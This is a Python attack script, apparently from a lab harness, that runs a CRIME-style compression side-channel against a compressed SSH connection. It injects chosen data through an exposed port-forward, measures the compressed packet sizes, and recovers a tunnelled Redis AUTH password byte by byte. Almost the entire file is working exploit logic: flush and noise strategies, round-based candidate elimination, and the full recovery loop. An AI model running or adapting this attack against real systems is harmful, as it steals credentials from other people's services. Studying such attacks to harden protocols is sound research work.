"""CRIME-style chosen-payload attack against SSH compression.

Realistic port-forward variant
------------------------------
The victim tunnels Redis (credentials) and an internal web server (cat
pictures) through one compressed SSH connection.  The web tunnel's local
port is bound to 0.0.0.0 and therefore reachable from the attacker's
network.

The attacker injects data by opening TCP connections to the victim's
web tunnel port.  Data sent on those connections enters the SSH tunnel
as ``direct-tcpip`` channel data in the **client-to-server** direction,
sharing the zlib compression context with the victim's Redis
traffic on the other tunnel.

Repeat-until-confident strategy
-------------------------------
Each byte position is recovered by sweeping 8 noise lengths (0..7) per
round and accumulating candidate sums across rounds.  After each round
the margin (difference between best and second-best sum) is checked.
If the margin exceeds a configurable threshold (default 16 wire bytes),
the position is considered resolved.  Otherwise another round is run
with fresh tunnel connections whose CHANNEL_OPEN bit-alignment jitter
is independent of previous rounds, so the compression signal accumulates
while the jitter averages out.

This makes the attack robust against the per-connection alignment noise
inherent in the port-forward scenario without requiring a fixed large
noise sweep that might still land entirely in one padding bin.
"""

from __future__ import annotations

import asyncio
import logging
import os
import secrets
import time
from typing import Any

import aiohttp

LOG = logging.getLogger("attack")

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
WEB_TUNNEL_PORT = int(os.environ.get("WEB_TUNNEL_PORT", "8080"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _c2s_total(records: list[dict[str, Any]]) -> int:
    """Sum c->s TCP payload bytes from one half of the forwarder."""
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 0
    )


async def _open_tunnel(retries: int = 20, delay: float = 1.0):
    """Open a TCP connection to the client's web tunnel."""
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, WEB_TUNNEL_PORT)
        except (OSError, ConnectionRefusedError) as exc:
            if attempt < retries:
                LOG.warning("tunnel connect attempt %d: %s", attempt, exc)
                await asyncio.sleep(delay)
            else:
                raise
    raise RuntimeError("unreachable")


# 8-bit DEFLATE literals (codes 0..143) absent from dictionary content.
_NOISE_POOL = list(range(0x80, 0x90))


def _make_noise(noise_len: int) -> bytes:
    """8-bit DEFLATE-literal noise drawn from ``_NOISE_POOL``."""
    if noise_len > len(_NOISE_POOL):
        raise ValueError(f"noise_len {noise_len} > pool size {len(_NOISE_POOL)}")
    return bytes(_NOISE_POOL[:noise_len])


# ---------------------------------------------------------------------------
# single-round sweep
# ---------------------------------------------------------------------------

async def _sweep_round(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
) -> dict[bytes, int]:
    """Run one noise-length sweep and return per-candidate wire-byte sums.

    Each (candidate, noise_length) iteration opens a **fresh** web-tunnel
    connection for flush and measure.  The CHANNEL_OPEN for each fresh
    connection has a different originator port, giving a random
    bit-alignment offset that varies between rounds — which is why
    repeating rounds lets the real signal accumulate while jitter
    averages out.

    Ordering within one iteration:

      1. Flush -- throwaway tunnel, 33 KiB random bytes.
      2. Open the measure tunnel -- CHANNEL_OPEN enters the compressor
         *before* the secret.
      3. Settle -- let CHANNEL_OPEN reach the sniffer.
      4. Trigger Redis AUTH -- secret enters compressor right before the
         guess, with no channel-management bytes in between.
      5. Settle.
      6. Clear packet log.
      7. Write guess on the measure tunnel.
      8. Settle.
      9. Read packet log.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    for noise_len in noise_lengths:
        noise = _make_noise(noise_len)
        for cb in alphabet:
            # 1. Flush (throwaway connection) -------------------------------
            flush_data = secrets.token_bytes(flush_bytes)
            try:
                _, fw = await _open_tunnel()
                fw.write(flush_data)
                await fw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                pass
            if settle > 0:
                await asyncio.sleep(settle)

            # 2-3. Open measure tunnel, let CHANNEL_OPEN settle ------------
            _, mw = await _open_tunnel()
            if settle > 0:
                await asyncio.sleep(settle)

            # 4-5. Refresh secret ------------------------------------------
            async with session.post(f"{CLIENT_BASE}/send_secret") as r:
                await r.read()
            if settle > 0:
                await asyncio.sleep(settle)

            # 6-9. Clear, guess, settle, read ------------------------------
            packet_log.clear()
            mw.write(prefix + cb + noise)
            await mw.drain()
            if settle > 0:
                await asyncio.sleep(settle)
            sums[cb] += _c2s_total(packet_log.snapshot())

            try:
                mw.close()
            except Exception:  # noqa: BLE001
                pass

    return sums


# ---------------------------------------------------------------------------
# per-position recovery with repeat-until-confident
# ---------------------------------------------------------------------------

async def crack_byte_position(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
    min_margin: int,
    max_rounds: int,
    log_prefix: str,
) -> tuple[bytes, dict[bytes, int]]:
    """Recover one byte, repeating rounds until *margin >= min_margin*.

    Each round sweeps all noise lengths with fresh tunnel connections.
    Candidate sums accumulate across rounds.  After each round,
    candidates whose sum exceeds ``best_sum + min_margin`` are
    eliminated — they can never catch the leader because wrong
    candidates never compress smaller than the correct one.  This
    progressively shrinks the alphabet, reducing the number of
    flush+AUTH cycles in later rounds.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    active = list(alphabet)

    for rnd in range(1, max_rounds + 1):
        round_sums = await _sweep_round(
            session, packet_log, prefix, active,
            noise_lengths, settle, flush_bytes,
        )
        for c in active:
            sums[c] += round_sums[c]

        ranked = sorted(
            [(c, sums[c]) for c in active], key=lambda kv: kv[1],
        )
        best, best_sum = ranked[0]
        second, second_sum = ranked[1] if len(ranked) > 1 else ranked[0]
        margin = second_sum - best_sum

        # Eliminate candidates that fell too far behind.
        before = len(active)
        active = [c for c, s in ranked if s - best_sum < min_margin]
        if len(active) < 2:
            active = [c for c, _ in ranked[:2]]
        eliminated = before - len(active)

        LOG.info(
            "%s round=%d best=%r sum=%d  2nd=%r sum=%d  "
            "margin=%d  alive=%d (-%d)",
            log_prefix, rnd,
            best.decode("latin-1"), best_sum,
            second.decode("latin-1"), second_sum,
            margin, len(active), eliminated,
        )
        if margin >= min_margin:
            break
    else:
        LOG.warning("%s margin=%d after %d rounds (threshold=%d)",
                    log_prefix, margin, max_rounds, min_margin)

    return best, sums


# ---------------------------------------------------------------------------
# full attack
# ---------------------------------------------------------------------------

async def run_attack(
    packet_log,
    known_prefix: bytes = b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
    alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 32,
    noise_lengths: list[int] | None = None,
    terminator: bytes = b"\r",
    settle: float = 0.01,
    flush_bytes: int = 33000,
    min_margin: int = 16,
    max_rounds: int = 16,
) -> dict[str, Any]:
    if noise_lengths is None:
        noise_lengths = list(range(8))
    alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info(
        "starting attack: known_prefix=%r alphabet_size=%d "
        "noise_lengths=%s settle=%.3f flush_bytes=%d "
        "min_margin=%d max_rounds=%d",
        known_prefix, len(alphabet), noise_lengths, settle,
        flush_bytes, min_margin, max_rounds,
    )

    started = time.time()
    recovered = b""
    history: list[dict[str, Any]] = []

    timeout = aiohttp.ClientTimeout(total=1800)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            best, sums = await crack_byte_position(
                session, packet_log,
                prefix=known_prefix + recovered,
                alphabet=alphabet,
                noise_lengths=noise_lengths,
                settle=settle,
                flush_bytes=flush_bytes,
                min_margin=min_margin,
                max_rounds=max_rounds,
                log_prefix=f"pos {pos:2d}",
            )
            ranked = [
                (k.decode("latin-1"), v)
                for k, v in sorted(sums.items(), key=lambda kv: kv[1])
            ]
            history.append({
                "position": pos,
                "best": best.decode("latin-1"),
                "ranked": ranked[:6],
            })
            if best == terminator:
                LOG.info("hit terminator at position %d -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r",
                     recovered.decode("latin-1"))
        else:
            LOG.warning("hit max_length=%d without terminator", max_length)

    elapsed = time.time() - started
    LOG.info("attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "history": history,
    }
